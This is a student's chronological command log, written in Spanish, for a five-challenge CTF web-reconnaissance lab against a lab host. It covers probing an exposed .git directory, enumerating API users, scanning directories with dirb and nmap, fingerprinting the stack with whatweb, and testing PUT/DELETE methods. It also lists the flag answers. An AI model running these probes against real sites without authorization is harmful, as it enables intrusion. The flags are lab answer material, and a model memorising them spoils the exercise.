@@ -1,0 +1,111 @@
+# Bitácora cronológica de comandos — Laboratorio 06 (Grupo 10)
+
+# ======================================================================
+# Reto 2: Repositorio Git expuesto (2026-11-01)
+# ======================================================================
+
+# 1. Verificación de conectividad inicial al objetivo
+curl -i -s http://phantomcorp/
+
+# 2. Comprobación del archivo de configuración de Git
+curl -i -s http://phantomcorp/.git/config
+
+# 3. Comprobación del puntero HEAD
+curl -i -s http://phantomcorp/.git/HEAD
+
+# 4. Exploración de metadatos, historial y objetos adicionales de Git
+curl -i -s http://phantomcorp/.git/logs/HEAD
+curl -i -s http://phantomcorp/.git/index
+curl -i -s http://phantomcorp/.git/objects/info/packs
+curl -i -s http://phantomcorp/.git/description
+curl -i -s http://phantomcorp/.git/COMMIT_EDITMSG
+curl -i -s http://phantomcorp/.git/
+
+# 5. Validación criptográfica de la flag encontrada
+echo -n 'FLAG{git_repo_exposed}' | sha256sum
+
+# 6. Registro formal de la flag en el sistema CTF
+./ctf submit 06 R2 'FLAG{git_repo_exposed}'
+
+# 7. Verificación del estado actualizado del laboratorio
+./ctf status 06
+
+# ======================================================================
+# Reto 4: Enumeración de usuarios mediante API (2026-11-03)
+# ======================================================================
+
+# R4.1. Construir el objetivo del Lab 06 y levantar la instancia aislada.
+docker compose -p lab06-r4-carolina --project-directory . -f entregas/lab06/grupo10/evidencia/entorno-r4.compose.yml up -d --build > entregas/lab06/grupo10/evidencia/salidas/r4_00_entorno_stdout.txt 2> entregas/lab06/grupo10/evidencia/salidas/r4_00_entorno_stderr.txt
+
+# R4.2. Comprobar la ruta base sugerida por la pista /api/...
+docker compose -p lab06-r4-carolina --project-directory . -f entregas/lab06/grupo10/evidencia/entorno-r4.compose.yml exec -T attacker curl --noproxy '*' --silent --show-error --connect-timeout 5 --max-time 15 --include --verbose http://phantomcorp/api > entregas/lab06/grupo10/evidencia/salidas/r4_01_api_http.txt 2> entregas/lab06/grupo10/evidencia/salidas/r4_01_api_peticion.txt
+
+# R4.3. Consultar el endpoint de usuarios del ejemplo de la consigna.
+docker compose -p lab06-r4-carolina --project-directory . -f entregas/lab06/grupo10/evidencia/entorno-r4.compose.yml exec -T attacker curl --noproxy '*' --silent --show-error --connect-timeout 5 --max-time 15 --include --verbose http://phantomcorp/api/users > entregas/lab06/grupo10/evidencia/salidas/r4_02_api_users_http.txt 2> entregas/lab06/grupo10/evidencia/salidas/r4_02_api_users_peticion.txt
+
+# R4.4. Consultar el estado local antes de enviar R4 (Git Bash).
+./ctf status 06 > entregas/lab06/grupo10/evidencia/salidas/r4_03_ctf_status_antes.txt 2> entregas/lab06/grupo10/evidencia/salidas/r4_03_ctf_status_antes_stderr.txt
+
+# R4.5. Validar con el motor oficial la flag recibida por HTTP (Git Bash).
+./ctf submit 06 R4 'FLAG{user_enumeration_api}' > entregas/lab06/grupo10/evidencia/salidas/r4_04_ctf_submit_r4.txt 2> entregas/lab06/grupo10/evidencia/salidas/r4_04_ctf_submit_r4_stderr.txt
+
+# R4.6. Registrar el estado posterior (Git Bash).
+./ctf status 06 > entregas/lab06/grupo10/evidencia/salidas/r4_05_ctf_status_despues.txt 2> entregas/lab06/grupo10/evidencia/salidas/r4_05_ctf_status_despues_stderr.txt
+
+# R4.7. Detener únicamente los contenedores creados para R4.
+docker compose -p lab06-r4-carolina --project-directory . -f entregas/lab06/grupo10/evidencia/entorno-r4.compose.yml stop > entregas/lab06/grupo10/evidencia/salidas/r4_06_entorno_stop_stdout.txt 2> entregas/lab06/grupo10/evidencia/salidas/r4_06_entorno_stop_stderr.txt
+
+# R4.8. Registro crudo y captura de terminal de estado posterior.
+./ctf status 06 > entregas/lab06/grupo10/evidencia/salidas/r4_07_ctf_status_terminal.txt
+
+# ======================================================================
+# Reto 1 y Reto 5: Directorios y Fingerprinting (2026-11-05)
+# ======================================================================
+
+# Estado previo a la ejecución de R1 y R5
+./ctf status 06 > entregas/lab06/grupo10/evidencia/salidas/r1r5_01_status_antes.txt
+
+# R1. Enumeración de directorios con dirb y extensiones comunes
+dirb http://phantomcorp/ -X .bak,.old,.txt,.html > entregas/lab06/grupo10/evidencia/salidas/r1_01_dirb_hallazgos.txt
+
+# R1. Inspección del directorio de respaldo encontrado
+curl -s -i http://phantomcorp/backup/ > entregas/lab06/grupo10/evidencia/salidas/r1_02_backup_listing.txt
+
+# R1. Confirmación de rutas conocidas con NSE de Nmap
+nmap --script http-enum -p80 phantomcorp > entregas/lab06/grupo10/evidencia/salidas/r1_03_http_enum.txt
+
+# R1. Entrega y validación de flag R1 en el motor CTF
+./ctf submit 06 R1 'FLAG{dir_enumeration_backup}' > entregas/lab06/grupo10/evidencia/salidas/r1_04_ctf_submit.txt
+
+# R5. Fingerprinting del stack web con whatweb
+whatweb -a 3 http://phantomcorp > entregas/lab06/grupo10/evidencia/salidas/r5_01_whatweb.txt
+
+# R5. Inspección del archivo de versión default de PhantomCMS
+curl -s -i http://phantomcorp/phantomcms/VERSION > entregas/lab06/grupo10/evidencia/salidas/r5_02_version_default.txt
+
+# R5. Entrega y validación de flag R5 en el motor CTF
+./ctf submit 06 R5 'FLAG{tech_fingerprint_phantomcms}' > entregas/lab06/grupo10/evidencia/salidas/r5_03_ctf_submit.txt
+
+# Estado posterior a R1 y R5
+./ctf status 06 > entregas/lab06/grupo10/evidencia/salidas/r1r5_02_status_despues.txt
+
+# ======================================================================
+# Reto 3: Métodos HTTP peligrosos habilitados (2026-11-06)
+# ======================================================================
+
+# R3.1. Consulta de métodos permitidos mediante OPTIONS
+curl -i -X OPTIONS http://phantomcorp/ > entregas/lab06/grupo10/evidencia/salidas/r3_01_options_http.txt
+
+# R3.2. Comprobación práctica de PUT y DELETE en ruta de prueba
+curl -i -X PUT http://phantomcorp/chiara-r3-test.txt --data-binary 'prueba de laboratorio' > entregas/lab06/grupo10/evidencia/salidas/r3_02_put_test.txt
+curl -i -X DELETE http://phantomcorp/chiara-r3-test.txt >> entregas/lab06/grupo10/evidencia/salidas/r3_02_put_test.txt
+curl -i http://phantomcorp/chiara-r3-test.txt >> entregas/lab06/grupo10/evidencia/salidas/r3_02_put_test.txt
+
+# R3.3. Entrega y validación de flag R3 en el motor CTF
+./ctf submit 06 R3 'FLAG{http_methods_put_enabled}' > entregas/lab06/grupo10/evidencia/salidas/r3_03_ctf_submit.txt
+
+# ======================================================================
+# Estado final unificado del laboratorio (5/5 completado)
+# ======================================================================
+
+./ctf status 06 > entregas/lab06/grupo10/evidencia/salidas/ctf_status_global.txt
